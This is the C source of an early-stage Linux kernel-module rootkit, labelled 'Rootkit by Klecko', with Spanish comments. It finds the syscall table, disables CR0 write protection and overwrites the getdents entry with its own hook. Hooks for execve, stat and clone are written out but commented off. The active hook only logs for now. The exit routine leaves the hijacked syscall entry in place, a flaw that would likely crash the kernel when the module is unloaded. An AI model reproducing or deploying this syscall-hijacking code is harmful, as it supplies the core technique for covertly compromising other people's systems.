#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kallsyms.h>
#include <linux/unistd.h> // __NR_syscall
#include <asm/paravirt.h> // write_cr0

#include "helper.h"

#define ENABLE_WRITE() write_cr0(read_cr0() & (~(1<<16)));
#define DISABLE_WRITE() write_cr0(read_cr0() | (1<<16));


MODULE_LICENSE("GPL");
MODULE_AUTHOR("Klecko");
MODULE_DESCRIPTION("Rootkit by Klecko");
MODULE_VERSION("0.1");

unsigned long *syscall_table = NULL;

typedef asmlinkage long (*sys_getdents_t)(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count);
sys_getdents_t sys_getdents_orig = NULL;
asmlinkage long sys_getdents_hook(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count) {
	long ret = sys_getdents_orig(fd, dirent, count);
	printk(KERN_INFO "ROOTKIT Hello from sys_getdents\n");
	return ret;
}

asmlinkage long (*sys_stat_orig)(const char __user *filename, struct __old_kernel_stat __user *statbuf);
asmlinkage long sys_stat_hook(const char __user *filename, struct __old_kernel_stat __user *statbuf){
	printk(KERN_INFO "ROOTKIT Hello from sys_stat\n");
	return sys_stat_orig(filename, statbuf);
}

asmlinkage long (*sys_clone_orig)(unsigned long a, unsigned long b, int __user * c, int __user * d, unsigned long e);
asmlinkage long sys_clone_hook(unsigned long a, unsigned long b, int __user * c, int __user * d, unsigned long e){
	printk(KERN_INFO "ROOTKIT Hello from sys_clone\n");
	return sys_clone_orig(a,b,c,d,e);
}


asmlinkage int (*sys_execve_orig)(const char* filename, char *const argv[], char *const envp[]);
asmlinkage int sys_execve_hook(const char *filename, char *const argv[], char *const envp[]) {
	pr_info("ROOTKIT hooked call to execve(%s, ...)\n", filename);
	return sys_execve_orig(filename, argv, envp);
}




//__init para que solo lo haga una vez y después pueda sacarlo de memoria
int __init hooks(void){
	if ((syscall_table = (void *)kallsyms_lookup_name("sys_call_table")) == 0){
		printk(KERN_ERR "ROOTKIT ERROR: Syscall table not found!");
		return -1;
	}
	printk(KERN_INFO "ROOTKIT Syscall table found at %lx\n", (long unsigned int)syscall_table);
	printk(KERN_INFO "ROOTKIT Starting hooks\n");

	//printk(KERN_INFO "ROOTKIT Original sys_getdents at %lx\n", original_sys_getdents);
	ENABLE_WRITE();
	//sys_getdents_orig = (void*)syscall_table[__NR_getdents]; // OJO CASTING
	//syscall_table[__NR_getdents] = &sys_getdents_hook;
	sys_getdents_orig = (sys_getdents_t)((void**)syscall_table)[__NR_getdents];
	syscall_table[__NR_getdents] = sys_getdents_hook;

	//sys_execve_orig = (void*)syscall_table[__NR_execve];
	//syscall_table[__NR_execve] = &sys_execve_hook;

	//sys_stat_orig = (void*)syscall_table[__NR_stat];
	//syscall_table[__NR_stat] = &sys_stat_hook;

	//sys_clone_orig = (void*)syscall_table[__NR_clone];
	//syscall_table[__NR_clone] = &sys_clone_hook;
	DISABLE_WRITE();

	printk(KERN_INFO "ROOTKIT Finished hooks\n");
	return 0;
}

//insmod
static int lkm_init(void){
    printk(KERN_INFO "ROOTKIT Starting Rootkit -----------------\n");
    return hooks();
}

//rmmod
static void lkm_exit(void){
    printk(KERN_INFO "ROOTKIT Finishing Rootkit ----------------\n");
}

module_init(lkm_init);
module_exit(lkm_exit);

